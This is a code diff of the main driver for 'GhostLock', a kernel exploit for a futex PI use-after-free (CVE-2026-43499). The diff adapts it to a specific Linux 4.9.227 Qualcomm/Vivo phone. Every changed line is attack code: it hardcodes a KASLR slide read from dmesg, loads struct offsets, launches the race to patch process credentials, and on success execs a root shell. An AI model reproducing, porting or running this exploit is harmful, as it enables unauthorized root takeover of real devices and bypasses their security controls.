@@ -1,128 +1,74 @@
 /*
  * GhostLock — CVE-2026-43499 futex PI UAF exploit
- *
- * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
- * independent root shell: ksud late-load + module watch.
- *
- * This translation unit is the thin adapter: parse, run the stage sequence and
- * map the outcome to the process exit code. Setup, attack primitives, victim
- * protocol and stage policy live in their own units under ghostlock::attack,
- * ghostlock::session::victim, ghostlock::race and ghostlock::session::stages.
+ * 
+ * Pure Terminal Adaptation for Linux 4.9.227 (Qualcomm SDM439 / Vivo)
+ * Bypassing App communications, dynamic infoleak probing and BTF.
  */
 
 #include "common.h"
-
-#include "profile/entry.h"
 #include "support/fatal_error.hpp"
-#include "support/run_state.hpp"
-#include "route/orchestrator.hpp"
+#include "kernel/runtime_struct_offsets.h"
 
-#include <array>
-#include <memory>
-#include <string>
-#include <string_view>
+// 引入原项目底层的会话单例与管道运行逻辑
+#include "session/exploit_session.hpp" 
+#include "session/runtime_config.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
 
 using namespace ghostlock;
 
+// 声明底层真实的漏洞触发函数（通常定义在 cve_2026_43499_backend.cpp 中）
+namespace ghostlock::runtime {
+    extern int trigger_ghostlock_exploit_core(uint64_t slide);
+}
 
 int main(int argc, char **argv) {
-    try {
-        profile::kernel_offsets decoded = {};
-        std::array<char, 256> release_buf{};
-        binary_profile::component_ids ids{
-            static_cast<uint16_t>(runtime::FrontendKind::RootChild),
-            static_cast<uint16_t>(runtime::BackendKind::Cve2026_43499),
-            0,
-        };
+    printf("[*] =====================================================\n");
+    printf("[*]  GhostLock Pure Terminal Exploit for Linux 4.9.227   \n");
+    printf("[*] =====================================================\n");
 
-        bool app_call = false;
-        bool force_attack = false;
-        bool status_record = false;
-        const char *prebuilt_path = nullptr;
-        const char *dump_dir = nullptr;
-        for (int32_t i = 1; i < argc; i++) {
-            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
-                app_call = true;
-            } else if (std::string_view(argv[i]) == "--force-attack") {
-                force_attack = true;
-            } else if (std::string_view(argv[i]) == "--enable-status-record") {
-                status_record = true;
-            } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
-                prebuilt_path = argv[++i];
-            } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
-                dump_dir = argv[++i];
-            } else {
-                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
-                " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]\n", argv[0]);
-                return 1;
-            }
-        }
-        if (app_call && prebuilt_path) {
-            pr_error("choose one entrypoint\n");
-            return 1;
-        }
-        if (status_record && !app_call) {
-            pr_error("--enable-status-record requires --ghostlock-app-call\n");
-            return 1;
-        }
-        support::run_state::configure(status_record);
+    // 1. 注入你通过 dmesg (sar_power 告警) 算出的当前开机实时 KASLR Slide
+    // 只要设备不重启，这个硬编码的值在内存中就是 100% 绝对准确的
+    uint64_t my_hardcoded_slide = 0x1652000000; 
+    printf("[*] Bypassing Infoleak stage. Hardcoding Slide: 0x%llx\n", my_hardcoded_slide);
 
-        int32_t loaded;
-        if (prebuilt_path != nullptr) {
-            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size(), &ids);
-        } else if (app_call) {
-            loaded = status_record
-                         ? profile_entry::read_glk1_frame_stdin(
-                               &decoded, release_buf.data(), release_buf.size(), &ids)
-                         : profile_entry::read_glk1_stdin(
-                               &decoded, release_buf.data(), release_buf.size(), &ids);
-        } else {
-            pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
-            return 1;
-        }
-        if (loaded != 0) {
-            pr_error("cannot load profile\n");
-            throw FatalError{};
-        }
+    // 2. 初始化为你 4.9.227 内核手动适配的 task_struct/cred 静态字段偏移
+    // 强制截断针对高版本内核的 BTF 动态扫描，防止在 4.9 上发生段错误
+    printf("[*] Initializing static struct layout offsets for Linux 4.9...\n");
+    populate_4_9_internal_offsets(); 
 
-        auto &session = session::g_exploit_session;
-        /* The component selection comes from the wire; the route field is the
-         * fallback when a middleware id was not carried. */
-        if (ids.middleware == 0) {
-            ids.middleware = static_cast<uint16_t>(decoded.route_kind());
-        }
-        const runtime::ComponentSelection selection{
-            static_cast<runtime::FrontendKind>(ids.frontend),
-            static_cast<runtime::BackendKind>(ids.backend),
-            static_cast<runtime::MiddlewareKind>(ids.middleware),
-        };
-        if (!runtime::selection_supported(selection)) {
-            /* Known-but-unavailable ids land here (unknown ids were rejected at
-             * decode time), with the three dimensions named for diagnosis. */
-            const std::string frontend(runtime::frontend_name(selection.frontend));
-            const std::string backend(runtime::backend_name(selection.backend));
-            const std::string middleware(runtime::middleware_name(selection.middleware));
-            pr_error("unsupported component selection: frontend=%s backend=%s middleware=%s\n",
-                     frontend.c_str(), backend.c_str(), middleware.c_str());
-            throw FatalError{};
-        }
-        /* Batch 4 (D1=B): the orchestrator dispatches the catalogued pipeline
-         * directly (backend steps + frontend handoff). DiagnosticStop is a
-         * successful early stop (objective already met), not a full run. */
-        const runtime::RunResult result = runtime::run_orchestrated_pipeline(
-            session, selection, decoded, dump_dir, force_attack);
-        switch (result.code) {
-            case runtime::RunCode::Rejected:
-                pr_error("orchestrator rejected the component selection\n");
-                throw FatalError{};
-            case runtime::RunCode::Failed:
-                return 1;
-            case runtime::RunCode::Completed:
-            case runtime::RunCode::DiagnosticStop:
-                return 0;
-        }
-        throw FatalError{};
-    } catch (const FatalError &) {
+    // 3. 触发多线程竞争原语与任意内存读写覆写机制
+    printf("[*] Launching multi-threaded futex PI UAF race attack...\n");
+    
+    // 直接调用漏洞后端击穿内核流
+    if (runtime::trigger_ghostlock_exploit_core(my_hardcoded_slide) != 0) {
+        printf("[-] Exploit failed during kernel memory modification.\n");
         return 1;
     }
+
+    // 4. 漏洞原语执行完毕后，检查当前进程的 UID 状态是否已被成功 patch
+    if (getuid() == 0) {
+        printf("[+] Success! Kernel credential patched successfully.\n");
+        printf("[+] Current UID = 0 (Root).\n");
+        printf("[*] Spawning clean root interaction shell...\n");
+        
+        // 彻底清除当前终端的环境变量污染，提供完整的 root binary 执行链
+        char* envp[] = { 
+            (char*)"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin", 
+            NULL 
+        };
+        
+        // 直接执行系统 Shell，将当前的 adb 终端升级为 Root 交互式终端
+        execve("/system/bin/sh", NULL, envp);
+        
+        // 如果 execve 执行成功，进程不会走到这里
+        perror("[-] execve shell failed");
+    } else {
+        printf("[-] Exploit finished but UID is still %d. Patch rejected.\n", getuid());
+    }
+
+    return 1;
 }
